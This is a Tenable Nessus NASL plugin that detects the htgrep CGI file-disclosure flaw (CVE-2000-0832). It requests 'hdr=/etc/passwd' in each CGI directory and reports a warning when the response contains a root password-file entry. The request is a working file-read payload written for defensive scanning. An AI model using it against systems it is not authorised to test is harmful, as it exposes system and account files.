#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10495);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0832");
 script_xref(name:"OSVDB", value:"394");
 
 script_name(english:"htgrep hdr Parameter Arbitrary File access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'htgrep' cgi is installed. This CGI has a well known security flaw
that lets anyone read arbitrary files with the privileges of the http
daemon (usually root or nobody)." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-08/0208.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks for the presence of /cgi-bin/htgrep");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 res = http_send_recv3(
   method:"GET", 
   item:string(dir, "/htgrep/file=index.html&hdr=/etc/passwd"),
   port:port
 );
 if (isnull(res)) exit(1, "The Server did not respond to the GET request.");

 if(egrep(pattern:".*root:.*:0:[01]:", string:res[2])){
   security_warning(port);
   exit(0);
 }
}
